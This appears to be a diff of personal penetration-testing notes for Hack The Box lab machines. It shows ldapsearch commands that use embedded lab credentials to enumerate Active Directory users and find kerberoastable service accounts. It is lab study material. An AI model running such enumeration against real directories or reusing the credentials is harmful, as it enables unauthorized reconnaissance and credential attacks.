@@ -3,10 +3,10 @@
     - ldapsearch -h 10.10.10.175 -x -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'     (Use searchbase as the starting point for the search instead of the default)
 ===========================================================================================
 #create list of users
-    - ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb"   |  grep sAMAccountName | cut -d: -f2 | awk '{print $1}'
+    - ldapsearch -x -h 10.10.10.192 -p 389 -D 'BLACKFIELD\support' -w '#00^BlackKnight' -b "dc=BLACKFIELD,dc=local"   |  grep sAMAccountName | cut -d: -f2 | awk '{print $1}'
 ============================================================================================
 # For lookup and found the user who can carry out kerberoating (Those accounts which have their Service Principal Name(SPN) set are kerberoastable. Usually these accounts are service accounts.)
-    - ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" serviceprincipalname
+    - ldapsearch -x -h 10.10.10.192 -p 389 -D 'BLACKFIELD\support' -w '#00^BlackKnight' -b "dc=BLACKFIELD,dc=local" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" serviceprincipalname
    
    -> result: # Administrator, Users, active.htb
                 dn: CN=Administrator,CN=Users,DC=active,DC=htb
